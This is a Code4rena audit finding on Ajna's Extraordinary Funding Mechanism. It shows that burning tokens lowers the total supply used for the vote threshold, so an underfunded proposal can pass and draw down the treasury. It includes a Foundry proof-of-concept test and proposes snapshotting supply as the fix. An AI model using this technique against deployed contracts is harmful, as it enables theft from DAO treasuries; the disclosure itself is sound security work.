## Tags

- bug
- 2 (Med Risk)
- downgraded by judge
- primary issue
- satisfactory
- selected for report
- sponsor acknowledged
- edited-by-warden
- M-08

# [The voting thresholds in Ajna's Extraordinary Funding Mechanism can be manipulated to execute proposals below the expected threshold.](https://github.com/code-423n4/2023-05-ajna-findings/issues/285) 

# Lines of code

https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L222-L227


# Vulnerability details

## Impact

This vulnerability presents a significant risk to the Ajna treasury. A malicious actor who owns a substantial amount of tokens could manipulate the voting mechanism by burning their own tokens, thereby lowering the minimum threshold of votes required for a proposal to pass. 
This tactic could allow him to siphon off substantial amounts from the treasury.


## Proof of Concept


By meeting a certain quorum of non-treasury tokens, token holders may take tokens from the treasury outside of the PFM by utilizing Extraordinary Funding Mechanism (EFM).

This mechanism works by allowing up to the percentage over 50% of non-treasury tokens (the “minimum threshold”) that vote affirmatively to be removed from the treasury – the cap on this mechanism is therefore 100% minus the minimum threshold (50% in this case). 

Examples:
1. If 51% of non-treasury tokens vote affirmatively for a proposal, up to 1% of the treasury may be withdrawn by the proposal
2. If 65% of non-treasury tokens vote affirmatively for a proposal, up to 15% of the treasury may be withdrawn by the proposal
3. If 50% or less of non-treasury tokens vote affirmatively for a proposal, 0% of the treasury may be withdrawn by the proposal


When submitting a proposal, the proposer must include the exact percentage of the treasury they would like to extract (“proposal threshold”), if the vote fails to reach this threshold, it will fail, and no tokens will be distributed. 

Example:
a. A proposer requests 10% of the treasury
1.  50%+10%=60%
2. If 65% of non-treasury tokens vote affirmatively, 10% of the treasury is released
3. If 59.9% of non-treasury tokens vote affirmatively, 0% of the treasury is released


The function that checks the conditions above are true, and the proposal has succeeded is `_extraordinaryProposalSucceeded`.

https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L164-L178

```solidity
    function _extraordinaryProposalSucceeded(
        uint256 proposalId_,
        uint256 tokensRequested_
    ) internal view returns (bool) {
        uint256 votesReceived          = uint256(_extraordinaryFundingProposals[proposalId_].votesReceived);

        // @audit-info check _getMinimumThresholdPercentage() function
        uint256 minThresholdPercentage = _getMinimumThresholdPercentage();

        return
            // succeeded if proposal's votes received doesn't exceed the minimum threshold required

            // @audit-info check _getSliceOfNonTreasury() function
            (votesReceived >= tokensRequested_ + _getSliceOfNonTreasury(minThresholdPercentage))
            &&
            // succeeded if tokens requested are available for claiming from the treasury
            (tokensRequested_ <= _getSliceOfTreasury(Maths.WAD - minThresholdPercentage))
        ;
    }
```

The vulnerability here lies in the `_getSliceOfNonTreasury()` function.

https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L222-L227

```solidity
    function _getSliceOfNonTreasury(
        uint256 percentage_
    ) internal view returns (uint256) {
        uint256 totalAjnaSupply = IERC20(ajnaTokenAddress).totalSupply();
        // return ((ajnaTotalSupply - treasury) * percentage + 10**18 / 2) / 10**18;
        return Maths.wmul(totalAjnaSupply - treasury, percentage_);
    }
```

The reason is that it relies on the **current** total supply and [AjnaToken inherits ERC20Burnable](https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/token/AjnaToken.sol#L11), a malicious user can burn his tokens to lower the minimum threshold needed for votes and make the proposal pass.


Bob, a token holder, owns 10% of the Ajna supply. He creates a proposal where he requests 20% of the treasury. For his proposal to pass, Bob needs to gather 70% of the votes (50% as the threshold because there are no other funded proposals yet and an additional 20% for the tokens he requested). Unfortunately, Bob only manages to acquire 61% of the total votes.

https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L206-L215

```solidity
    function _getMinimumThresholdPercentage() internal view returns (uint256) {
        // default minimum threshold is 50
        if (_fundedExtraordinaryProposals.length == 0) {
            return 0.5 * 1e18;
        }
        // minimum threshold increases according to the number of funded EFM proposals
        else {
            // @audit-info 10 proposals max
            return 0.5 * 1e18 + (_fundedExtraordinaryProposals.length * (0.05 * 1e18));
        }
    }
```

```solidity
        return            
            // 70%              20%                
            (votesReceived >= tokensRequested_ 

							50%
			+ _getSliceOfNonTreasury(minThresholdPercentage))
            &&
            // succeeded if tokens requested are available for claiming from the treasury
            (tokensRequested_ <= _getSliceOfTreasury(Maths.WAD - minThresholdPercentage))
        ;
```

Bob then burns 10% of his own tokens. This action reduces the total supply and, consequently, the threshold too. Now, the proposal needs only 61% to pass, and since Bob already has this percentage, he can execute his proposal and siphon off funds from the treasury.


Here's a PoC that can be used to showcase the issue:

For the ease of use, please add a console.log to the `_extraordinaryProposalSucceeded` function
```diff
function _extraordinaryProposalSucceeded(
        uint256 proposalId_,
        uint256 tokensRequested_
    ) internal view returns (bool) {
        uint256 votesReceived          = uint256(_extraordinaryFundingProposals[proposalId_].votesReceived);

        uint256 minThresholdPercentage = _getMinimumThresholdPercentage();

+        console.log("tokensNeeded", tokensRequested_ + _getSliceOfNonTreasury(minThresholdPercentage));

        return            
            // 50k            30k                // 50k
            (votesReceived >= tokensRequested_ + _getSliceOfNonTreasury(minThresholdPercentage))
            &&
            // succeeded if tokens requested are available for claiming from the treasury
            (tokensRequested_ <= _getSliceOfTreasury(Maths.WAD - minThresholdPercentage))
        ;
    }
```

```solidity
  function testManipulateSupply() external {
        // 14 tokenholders self delegate their tokens to enable voting on the proposals
        _selfDelegateVoters(_token, _votersArr);

        vm.roll(_startBlock + 100);

        // set proposal params
        uint256 endBlockParam = block.number + 100_000;

        // generate proposal targets
        address[] memory targets = new address[](1);
        targets[0] = address(_token);

        // generate proposal values
        uint256[] memory values = new uint256[](1);
        values[0] = 0;

        // generate proposal calldata
        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = abi.encodeWithSignature(
            "transfer(address,uint256)",
            _tokenHolder1,
            50_000_001 * 1e18
        );

        // create and submit proposal
        TestProposalExtraordinary memory testProposal = _createProposalExtraordinary(
            _grantFund,
            _tokenHolder1,
            endBlockParam,
            targets,
            values,
            calldatas,
            "Extraordinary Proposal for Ajna token transfer to tester address"
        );

        vm.roll(_startBlock + 150);


        uint256 votingWeight = _grantFund.getVotesExtraordinary(_tokenHolder2, testProposal.proposalId);


        changePrank(_tokenHolder2);
        _grantFund.voteExtraordinary(testProposal.proposalId);
        
        uint256 totalSupply = _token.totalSupply();

        address bob = makeAddr("bob");

        changePrank(_tokenDeployer);

        _token.transfer(bob, _token.balanceOf(_tokenDeployer));

        changePrank(bob);
        _token.burn(_token.balanceOf(bob));

        vm.roll(_startBlock + 217_000);

        _grantFund.state(testProposal.proposalId);
    }
```

Running the test with Bob burning tokens

```solidity
        uint256 totalSupply = _token.totalSupply();

        address bob = makeAddr("bob");

        changePrank(_tokenDeployer);

        _token.transfer(bob, _token.balanceOf(_tokenDeployer));

        changePrank(bob);
        _token.burn(_token.balanceOf(bob));
```

Yields the following result:

![](https://i.imgur.com/NdNBqMs.png)

Whereas if we remove the burning, the tokens needed are increased

```diff
-        uint256 totalSupply = _token.totalSupply();

-        address bob = makeAddr("bob");

-        changePrank(_tokenDeployer);

-        _token.transfer(bob, _token.balanceOf(_tokenDeployer));

-        changePrank(bob);
-        _token.burn(_token.balanceOf(bob));
```

![](https://i.imgur.com/LMIoxYs.png)
.


## Tools Used

Manual Review

## Recommended Mitigation Steps

To mitigate this vulnerability, consider implementing a mechanism that uses a snapshot of the total supply at the time of proposal submission rather than the current total supply. This change will prevent the threshold from being manipulated by burning tokens.





## Assessed type

Other